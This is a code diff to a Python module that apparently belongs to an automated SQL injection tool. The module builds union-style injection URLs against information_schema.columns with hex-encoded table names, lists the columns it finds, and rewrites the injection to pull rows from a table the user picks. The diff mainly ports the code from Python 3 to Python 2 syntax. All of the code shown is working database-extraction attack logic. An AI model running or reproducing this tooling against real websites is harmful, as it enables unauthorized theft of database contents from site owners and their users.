@@ -1,25 +1,21 @@
 import s_data
-import binascii
-from prints import print_data
+from prints import print_data, print_cols_tables
 from requests import get_the_page
 
 
-def search_in_columns(site, table, based):
+def search_in_columns(site, table, based, database):
     site = site + table + "--" + based
     the_page = get_the_page(site, "2")
     columns_found = s_data.search_for(the_page)
     total_cols = len(columns_found)
 
     if total_cols:
-        print_data(columns_found, ['Columns Found'])
-        back_table = table
-        table = table.encode()
-        table = binascii.unhexlify(table)
-        table = table.decode()
-        site = site.replace("+FROM+information_schema.columns+WHERE+table_name=0x" +
-                            back_table + "--", "+AS/**/details/**/FROM/**/" + table + "--")
+        print_cols_tables(columns_found, 'Columns Found')
+        table = table.decode("hex")
+        site = site.replace("information_schema.columns+WHERE+table_name=0x" +
+                            table.encode("hex") + "--", database + '.' + table + "--")
 
-        columns = input("Give the columns: ")
+        columns = raw_input("Give the columns: ")
 
         selected_columns = []
         for column in columns_found:
@@ -39,6 +35,6 @@ def search_in_columns(site, table, based):
         total_data = s_data.search_for(the_page)
 
         if not len(total_data):
-            print("No data found!")
+            print "No data found!"
         else:
-            print_data(total_data, selected_columns)
+            print_data(total_data, selected_columns, table)
